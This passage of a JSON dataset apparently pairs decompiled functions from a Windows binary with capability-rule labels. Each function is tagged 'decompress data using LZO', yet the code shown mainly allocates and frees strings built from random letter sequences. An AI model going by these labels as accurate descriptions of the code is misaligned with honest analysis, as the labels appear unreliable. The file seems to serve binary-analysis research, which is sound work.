4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x0044629d;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x004462a9;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x004462b5;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x004462c1;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x54293c;\n    }\n    in_stack_ffffff44 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff44 < 0x1000) {\ncode_r0x00445fab:\n        fcn.00401a32(uVar1);\n        goto code_r0x00445fb7;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff44 = uStack64 + 0x24;\n        goto code_r0x00445fab;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00446279:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00446285:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00446291:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0044629d:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x004462a9:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x004462b5:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x004462c1:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 2095
    },
    "00402955": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.00402955(uint *param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000024;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_0000003c;\n    int32_t in_stack_00000040;\n    uint32_t in_stack_00000054;\n    int32_t in_stack_00000064;\n    uint32_t in_stack_00000078;\n    int32_t in_stack_0000007c;\n    uint32_t in_stack_00000090;\n    int32_t aiStack88 [4];\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    uchar uStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack88;\n    uStack24 = 0x414a00;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack72 = 0;\n    uStack68 = 0xf;\n    aiStack88[0] = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x1b);\n    uStack48 = 0;\n    uStack44 = 0xf;\n    iStack64 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x17, uStack36, \"hlctamgpzzidyfpfputvxwq\");\n    *puStack40 = 0;\n    puStack40[4] = 0;\n    puStack40[5] = 0xf;\n    *puStack40 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x13, uStack36, \"mdunvuihxjybpqbxiif\");\n    if (uStack44 < 0x10) {\ncode_r0x0041251c:\n        if (0xf < uStack68) {\n            iVar2 = aiStack88[0];\n            if ((0xfff < uStack68 + 1) && (iVar2 = *(aiStack88[0] + -4),  0x1f < (aiStack88[0] + -4) - iVar2))\n            goto code_r0x004126e5;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000024) {\n            iVar2 = param_4;\n            if ((0xfff < in_stack_00000024 + 1) && (iVar2 = *(param_4 + -4),  0x1f < (param_4 + -4) - iVar2))\n            goto code_r0x004126f1;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000003c) {\n            iVar2 = in_stack_00000028;\n            if ((0xfff < in_stack_0000003c + 1) &&\n               (iVar2 = *(in_stack_00000028 + -4),  0x1f < (in_stack_00000028 + -4) - iVar2)) goto code_r0x004126fd;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000054) {\n            iVar2 = in_stack_00000040;\n            if ((0xfff < in_stack_00000054 + 1) &&\n               (iVar2 = *(in_stack_00000040 + -4),  0x1f < (in_stack_00000040 + -4) - iVar2)) goto code_r0x00412709;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000078) {\n            iVar2 = in_stack_00000064;\n            if ((0xfff < in_stack_00000078 + 1) &&\n               (iVar2 = *(in_stack_00000064 + -4),  0x1f < (in_stack_00000064 + -4) - iVar2)) goto code_r0x00412715;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000090) {\n            iVar2 = in_stack_0000007c;\n            if ((0xfff < in_stack_00000090 + 1) &&\n               (iVar2 = *(in_stack_0000007c + -4),  0x1f < (in_stack_0000007c + -4) - iVar2)) goto code_r0x00412721;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack64;\n    if ((uStack44 + 1 < 0x1000) || (iVar2 = *(iStack64 + -4),  (iStack64 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0041251c;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004126e5:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004126f1:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x004126fd:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00412709:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00412715:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00412721:\n    uStack20 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1473
    },
    "00402a13": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00402a13(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cc30;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    pcStack136 = \"fxtjfhfvnuguvernfjvrvcwyfcupifjobhelirbrkbzatcemoexjclyowxgcebfahkotkkcynumdrgpzgfwidzvdiqvesifcfwgt\";\n    auStack144[0] = 100;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x3c, iStack60, \"iqkztjpxzqqfocumzdpuxswagtmppsfqdclbpyhhvkqmnqxlewklecacmqhv\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 5;\n    fcn.00402f72(100, iStack108, \n                 \"fxtjfhfvnuguvernfjvrvcwyfcupifjobhelirbrkbzatcemoexjclyowxgcebfahkotkkcynumdrgpzgfwidzvdiqvesifcfwgt\")\n    ;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 6;\n    fcn.00402f72(100, uStack36, \n                 \"fxtjfhfvnuguvernfjvrvcwyfcupifjobhelirbrkbzatcemoexjclyowxgcebfahkotkkcynumdrgpzgfwidzvdiqvesifcfwgt\")\n    ;\n    if (uStack88 < 0x10) {\ncode_r0x004447d7:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x004448c9;\n            fcn.00401a32(iVar2);\n        }\n        param_1[5] = 0xf;\n        param_1[4] = 10;\n        *param_1 = 0x69667566;\n        param_1[1] = 0x616d6b76;\n        *(param_1 + 2) = 0x6f66;\n        *(param_1 + 10) = 0;\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x004448d5;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x004448e1;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar2 = *(iStack108 + -4),  (iStack108 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004447d7;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004448c9:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004448d5:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x004448e1:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1268
    },
    "00402a36": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00402a36(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c530;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"febpnpocdkjmudczsbkrisotbmgwtuhpfklgyxpofwqlwuphmmzuostglutxd\";\n    auStack120[0] = 0x3d;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x3d, iStack84, \"febpnpocdkjmudczsbkrisotbmgwtuhpfklgyxpofwqlwuphmmzuostglutxd\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x3d, uStack36, \"febpnpocdkjmudczsbkrisotbmgwtuhpfklgyxpofwqlwuphmmzuostglutxd\");\n    if (uStack64 < 0x10) {\ncode_r0x0042fbe3:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0042fc70;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0042fc7c;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    iVar2 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar2 = *(iStack84 + -4),  (iStack84 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0042fbe3;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042fc70:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042fc7c:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 875
    },
    "00402a86": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00402a86(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c7c0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"luxhrwlsdxchhzlzktmdirwkepazjwekssbnstxjyciyzdjyrbeurgvxjdpwmzshguszhgosmoydljabu\";\n    auStack120[0] = 0x51;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x51, iStack84, \"luxhrwlsdxchhzlzktmdirwkepazjwekssbnstxjyciyzdjyrbeurgvxjdpwmzshguszhgosmoydljabu\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x51, uStack36, \"luxhrwlsdxchhzlzktmdirwkepazjwekssbnstxjyciyzdjyrbeurgvxjdpwmzshguszhgosmoydljabu\");\n    if (uStack64 < 0x10) {\ncode_r0x004370b3:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00437140;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0043714c;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    iVar2 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar2 = *(iStack84 + -4),  (iStack84 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004370b3;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00437140:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043714c:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 906
    },
    "00402acc": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00402acc(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    int32_t in_stack_00000048;\n    uint32_t in_stack_0000005c;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c8d0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x21);\n    if (uStack40 < 0x10) {\ncode_r0x0043a259:\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x0043a347;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar2 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar2 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar2)) goto code_r0x0043a353;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000005c) {\n            iVar2 = in_stack_00000048;\n            if ((0xfff < in_stack_0000005c + 1) &&\n               (iVar2 = *(in_stack_00000048 + -4),  0x1f < (in_stack_00000048 + -4) - iVar2)) goto code_r0x0043a35f;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x44ee;\n    }\n    iVar2 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0043a259;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043a347:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043a353:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043a35f:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 849
    },
    "00402af4": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\ncode ** __thiscall fcn.00402af4(code **param_1, code *param_2, code *param_3, uint32_t **param_4)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    code **ppcVar5;\n    uint32_t **ppuVar6;\n    uchar *puVar7;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_ffffff8c;\n    uchar *puStack80;\n    uint32_t uStack60;\n    uchar *puStack56;\n    uchar uStack52;\n    uchar *puStack48;\n    uint32_t *puStack44;\n    uint32_t **ppuStack40;\n    code **ppcStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack48 = &stack0xffffffb0;\n    puStack32 = &stack0xffffffb0;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e380;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puVar3 = param_4[4];\n    ppuVar6 = param_4;\n    if (0xf < param_4[5]) {\n        ppuVar6 = *param_4;\n    }\n    ppcStack36 = param_1;\n    if (puVar3 < 0x10) {\n        puVar3 = *ppuVar6;\n        puStack48 = &stack0xffffffb0;\n        puStack32 = &stack0xffffffb0;\n    }\n    else {\n        uVar4 = 0x7fffffff;\n        if ((puVar3 | 0xf) < 0x7fffffff) {\n            uVar4 = puVar3 | 0xf;\n        }\n        puStack44 = puVar3;\n        ppuStack40 = ppuVar6;\n        if (uVar4 < 0xfff) {\n            puVar3 = fcn.004024b9(uVar4 + 1, in_stack_ffffff8c);\n        }\n        else {\n            puStack48 = &stack0xffffffb0;\n            puStack32 = &stack0xffffffb0;\n            uVar4 = fcn.004024b9(uVar4 + 0x24, in_stack_ffffff8c);\n            puVar3 = uVar4 + 0x23 & 0xffffffe0;\n            puVar3[-1] = uVar4;\n        }\n        fcn.0040576d(puVar3, ppuStack40, puStack44 + 1);\n    }\n    fcn.00406311(&stack0xffffffb0, param_2, param_3, puVar3);\n    puVar2 = puStack48;\n    puStack56 = &stack0xffffffb0;\n    if (0xf < uStack60) {\n        puStack56 = puStack80;\n    }\n    *ppcStack36 = vtable.std::exception.0;\n    ppcStack36[2] = NULL;\n    ppcStack36[1] = NULL;\n    uStack52 = 1;\n    uStack20 = 0;\n    *(puStack48 + -4) = ppcStack36 + 1;\n    *(puVar2 + -8) = &stack0xffffffc8;\n    *(puVar2 + -0xc) = 0x419074;\n    fcn.00402dd3(*(puVar2 + -8), *(puVar2 + -4));\n    ppcVar5 = ppcStack36;\n    *ppcStack36 = vtable.std::runtime_error.0;\n    if (0xf < uStack60) {\n        uVar4 = uStack60 + 1;\n        puVar7 = puStack80;\n        if (0xfff < uVar4) {\n            puVar7 = *(puStack80 + -4);\n            if (0x1f < puStack80 + (-4 - puVar7)) {\n                uStack20 = 1;\n                *(puVar2 + -4) = 0x4190e7;\n                fcn.004047f5();\n                *(puVar2 + -4) = &stack0xfffffffc;\n                *(puVar2 + -0x2c) = 0x4190fc;\n                fcn.004052d1();\n                *(puVar2 + -0x2c) = &stack0x00000008;\n                *(puVar2 + -0x54) = 0x41910c;\n                fcn.004052d1();\n                pcVar1 = swi(3);\n                ppcVar5 = (*pcVar1)();\n                return ppcVar5;\n            }\n            uVar4 = uStack60 + 0x24;\n        }\n        *(puVar2 + -4) = uVar4;\n        *(puVar2 + -8) = puVar7;\n        *(puVar2 + -0xc) = 0x4190b1;\n        fcn.00401a32(*(puVar2 + -8));\n    }\n    *ppcVar5 = vtable.std::_System_error.0;\n    ppcVar5[3] = param_2;\n    ppcVar5[4] = param_3;\n    *in_FS_OFFSET = iStack28;\n    return ppcVar5;\n}\n",
        "token_count": 1216
    },
    "00402b08": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402b08(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x44cab0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 5;\n    pcStack112 = \"yldorxjyylshjtgfqmqmdxfjzkdzdysfmnirsnzbkglpdaqxyrliktkoghjjripwxsjdtueikixde\";\n    auStack120[0] = 0x4d;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x4d, iStack84, \"yldorxjyylshjtgfqmqmdxfjzkdzdysfmnirsnzbkglpdaqxyrliktkoghjjripwxsjdtueikixde\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x4d, uStack36, \"yldorxjyylshjtgfqmqmdxfjzkdzdysfmnirsnzbkglpdaqxyrliktkoghjjripwxsjdtueikixde\");\n    if (uStack64 < 0x10) {\ncode_r0x0043f2ad:\n        if (0xf < uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x0043f3c2;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack88) {\n            iVar1 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar1 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar1))\n            goto code_r0x0043f3ce;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x0043f3da;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar1 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar1 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar1)) goto code_r0x0043f3e6;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar1 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar1 = *(iStack84 + -4),  (iStack84 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0043f2ad;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043f3c2:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043f3ce:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043f3da:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0043f3e6:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 1200
    },
    "00402b30": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00402b30(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    float10 fVar3;\n    int32_t in_stack_00000010;\n    uint32_t in_stack_00000024;\n    uint32_t in_stack_fffffefc;\n    uint auStack192 [2];\n    char *pcStack184;\n    int32_t iStack180;\n    uint uStack164;\n    uint32_t uStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack192;\n    uStack24 = 0x44c850;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack164 = 0;\n    uStack160 = 0xf;\n    iStack180 = 0;\n    uStack20 = 9;\n    pcStack184 = \"uxpjckxbruqvfaowlprymboubg\";\n    auStack192[0] = 0x1a;\n    fcn.00402f72();\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x12, iStack132, \"qtxiwntfxxjufzwjbs\");\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x29, iStack108, \"yjwydijoncrvnljquzzgsjsdjjiptughaavipyufc\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x45, iStack60, \"pzzoiwvltusvydzmqxmybqdiuufzuivbkxjucwsvjurktzwezmocrerbaemdzuurchptm\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xd;\n    fcn.00402f72(0x12, uStack84, \"qtxiwntfxxjufzwjbs\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xf;\n    fcn.00402f72(0x12, uStack36, \"qtxiwntfxxjufzwjbs\");\n    if (uStack64 < 0x10) {\ncode_r0x004388c1:\n        if (0xf < uStack40) {\n            in_stack_fffffefc = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_fffffefc) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x00438b4c;\n                in_stack_fffffefc = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        